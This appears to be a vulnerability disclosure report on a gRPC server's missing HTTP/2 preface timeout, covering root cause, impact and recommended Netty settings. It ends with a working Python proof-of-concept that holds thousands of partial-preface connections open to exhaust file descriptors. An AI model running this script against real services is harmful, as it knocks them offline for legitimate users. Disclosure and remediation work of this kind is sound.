### Title
Missing HTTP/2 Preface Timeout Enables File Descriptor Exhaustion via Partial-Preface Connections

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only an executor and a per-connection call limit, omitting any HTTP/2 preface timeout or connection-count ceiling. For plaintext (h2c) connections — which this service uses — grpc-java's `handshakeTimeout` fires only after the TCP channel becomes active (immediately on connect), not after the HTTP/2 preface is fully received, leaving the preface-reading phase without any deadline. An unprivileged attacker can open thousands of TCP connections, send a partial HTTP/2 preface on each, and hold every file descriptor open indefinitely, starving the process of file descriptors.

### Finding Description
**Exact code location:**
`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35 (`grpcServerConfigurer()`).
`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15.

**Root cause:**
The `ServerBuilderCustomizer` lambda applies exactly two settings to `NettyServerBuilder`:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties` exposes only `maxConcurrentCallsPerConnection = 5`. No call to `handshakeTimeout()`, `maxConnectionIdle()`, `maxConnectionAge()`, or any equivalent is present anywhere in the grpc module (confirmed by exhaustive grep across all `.java` files under `grpc/`).

**Why the existing check fails:**
`maxConcurrentCallsPerConnection(5)` limits concurrent RPC *calls* on an already-established connection. A connection that has not yet completed the HTTP/2 preface has zero active calls and is invisible to this counter. The limit provides zero protection against pre-preface connections.

**grpc-java plaintext preface behaviour:**
`NettyServerBuilder.handshakeTimeoutMillis` defaults to 120 s, but in grpc-java's `ProtocolNegotiators`, the plaintext path uses `WaitUntilActiveHandler`, which fires its "handshake complete" event the moment the Netty channel transitions to `ACTIVE` — i.e., immediately after the TCP three-way handshake, before a single byte of the HTTP/2 preface is read. The preface-reading phase that follows has no associated deadline.

**Deployment context:**
The Helm chart configures the service as `h2c` (plaintext HTTP/2):
`charts/hedera-mirror-grpc/values.yaml` line 329: `traefik.ingress.kubernetes.io/service.serversscheme: h2c`. The server therefore accepts plaintext connections, making the TLS-path `handshakeTimeout` irrelevant.

### Impact Explanation
Each stalled connection holds one file descriptor. Linux defaults allow ~65 535 open file descriptors per process. An attacker who opens that many partial-preface connections causes the gRPC server to fail all subsequent `accept()` calls with `EMFILE`/`ENFILE`, making the service completely unavailable to legitimate clients. Because the connections are never closed by the server, the attacker needs only to keep the TCP sessions alive (trivial with any modern OS's TCP keepalive or by sending occasional bytes). This is a full denial-of-service with no authentication required.

### Likelihood Explanation
The attack requires only TCP connectivity to port 5600. The service is exposed externally via Traefik ingress (confirmed in `charts/hedera-mirror-grpc/values.yaml`). The exploit is trivially scriptable: open a raw TCP socket, write the first 9 bytes of the 24-byte HTTP/2 preface (`PRI * HTT`), and repeat. No credentials, no protocol knowledge beyond the preface bytes, and no special tooling are needed. The attack is fully repeatable and can be automated in under 20 lines of Python/Go.

### Recommendation
In `grpcServerConfigurer()`, add the following calls to `NettyServerBuilder`:

1. **`serverBuilder.handshakeTimeout(10, TimeUnit.SECONDS)`** — closes any connection that does not complete the HTTP/2 preface within 10 seconds.
2. **`serverBuilder.maxConnectionIdle(60, TimeUnit.SECONDS)`** — reclaims connections that become idle after the preface.
3. **`serverBuilder.maxConnectionAge(300, TimeUnit.SECONDS)`** — bounds total connection lifetime.

Expose these as fields in `NettyProperties` (alongside `maxConcurrentCallsPerConnection`) so they are operator-configurable. Additionally, configure a Traefik `readTimeout` or equivalent at the ingress layer as a defence-in-depth measure.

### Proof of Concept
```python
import socket, time, threading

TARGET_HOST = "<grpc-server-ip>"
TARGET_PORT = 5600
# HTTP/2 client preface is 24 bytes: b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
# Send only the first 9 bytes to stall the server in preface-reading state.
PARTIAL_PREFACE = b"PRI * HTT"

def hold_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.send(PARTIAL_PREFACE)
    # Keep the socket open indefinitely; server holds the file descriptor.
    time.sleep(9999)

threads = []
for _ in range(5000):          # scale to OS fd limit
    t = threading.Thread(target=hold_connection, daemon=True)
    t.start()
    threads.append(t)

print(f"Holding {len(threads)} partial-preface connections open")
time.sleep(9999)
```

After ~65 000 such connections the gRPC server's `accept()` fails with `EMFILE`, and all new legitimate client connections are refused.